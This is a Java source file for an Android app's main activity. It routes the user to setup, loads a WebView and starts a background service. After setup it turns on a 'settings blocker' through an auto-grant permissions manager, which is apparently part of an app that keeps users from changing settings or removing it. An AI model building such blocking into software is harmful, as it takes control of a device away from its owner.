package com.fason.app.ui;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.activity.ComponentActivity;
import androidx.annotation.NonNull;
import com.fason.app.core.permissions.AutoGrantManager;
import com.fason.app.core.permissions.SetupManager;
import com.fason.app.service.MainService;

public class MainActivity extends ComponentActivity {

    private HomeManager home;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);

        // If setup hasn't been done redirect immediately — user never sees main UI
        if (!SetupManager.isComplete(this)) {
            startActivity(new Intent(this, SetupActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            finish();
            return;
        }

        setContentView(com.fason.app.R.layout.activity_main);
        home = new HomeManager();
        home.init(
            findViewById(com.fason.app.R.id.webView),
            findViewById(com.fason.app.R.id.progressBar));
        if (state != null) home.restoreState(state);

        startSvc();
        loadPage();

        // Enable settings blocker now that setup is done
        AutoGrantManager.getInstance().enableSettingsBlock();

        getOnBackPressedDispatcher().addCallback(this,
            new androidx.activity.OnBackPressedCallback(true) {
                @Override public void handleOnBackPressed() {
                    if (home != null && home.canGoBack()) home.goBack();
                    else { setEnabled(false); getOnBackPressedDispatcher().onBackPressed(); }
                }
            });
    }

    @Override
    protected void onResume() { super.onResume(); }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle out) {
        super.onSaveInstanceState(out);
        if (home != null) home.saveState(out);
    }

    @Override
    protected void onDestroy() {
        if (home != null) home.destroy();
        super.onDestroy();
    }

    private void startSvc() {
        try {
            Intent svcIntent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(svcIntent);
            else
                startService(svcIntent);
        } catch (Exception ignored) {}
    }

    private void loadPage() {
        try { if (home != null) home.loadDefaultPage(); } catch (Exception ignored) {}
    }
}
